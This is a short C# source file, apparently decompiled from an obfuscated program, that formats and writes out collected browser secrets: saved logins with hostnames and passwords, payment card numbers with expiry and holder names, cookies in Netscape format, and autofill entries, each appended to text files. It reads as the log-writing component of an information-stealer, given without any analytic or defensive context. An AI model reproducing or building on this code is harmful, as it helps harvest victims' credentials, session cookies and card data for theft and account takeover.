using System.Collections.Generic;
using System.IO;

internal sealed class Class58
{
	private static string smethod_0(GStruct0 gstruct0_0)
	{
		return $"Hostname: {gstruct0_0.String_0}\nUsername: {gstruct0_0.String_1}\nPassword: {gstruct0_0.String_2}\n\n";
	}

	private static string smethod_1(Struct1 struct1_0)
	{
		return string.Format("Type: {0}\nNumber: {1}\nExp: {2}\nHolder: {3}\n\n", Class48.smethod_2(struct1_0.String_0), struct1_0.String_0, struct1_0.String_2 + "/" + struct1_0.String_1, struct1_0.String_3);
	}

	private static string smethod_2(Struct0 struct0_0)
	{
		return $"{struct0_0.String_0}\tTRUE\t{struct0_0.String_2}\tFALSE\t{struct0_0.String_3}\t{struct0_0.String_1}\t{struct0_0.String_5}\r\n";
	}

	private static string smethod_3(Struct2 struct2_0)
	{
		return $"{struct2_0.string_0}\t\n{struct2_0.string_1}\t\n\n";
	}

	private static string smethod_4(Struct4 struct4_0)
	{
		if (!string.IsNullOrEmpty(struct4_0.String_0))
		{
			return $"### {struct4_0.String_1} ### ({struct4_0.String_0})\n";
		}
		return $"### {struct4_0.String_1} ###\n";
	}

	public static bool smethod_5(List<Struct0> list_0, string string_0)
	{
		try
		{
			foreach (Struct0 item in list_0)
			{
				File.AppendAllText(string_0, smethod_2(item));
			}
			return true;
		}
		catch
		{
			return false;
		}
	}

	public static bool smethod_6(List<Struct2> list_0, string string_0)
	{
		try
		{
			foreach (Struct2 item in list_0)
			{
				File.AppendAllText(string_0, smethod_3(item));
			}
			return true;
		}
		catch
		{
			return false;
		}
	}

	public static bool smethod_7(List<Struct4> list_0, string string_0)
	{
		try
		{
			foreach (Struct4 item in list_0)
			{
				File.AppendAllText(string_0, smethod_4(item));
			}
			return true;
		}
		catch
		{
			return false;
		}
	}

	public static bool smethod_8(List<GStruct0> list_0, string string_0)
	{
		try
		{
			foreach (GStruct0 item in list_0)
			{
				if (!(item.String_1 == "") && !(item.String_2 == ""))
				{
					File.AppendAllText(string_0, smethod_0(item));
				}
			}
			return true;
		}
		catch
		{
			return false;
		}
	}

	public static bool smethod_9(List<Struct1> list_0, string string_0)
	{
		try
		{
			foreach (Struct1 item in list_0)
			{
				File.AppendAllText(string_0, smethod_1(item));
			}
			return true;
		}
		catch
		{
			return false;
		}
	}
}
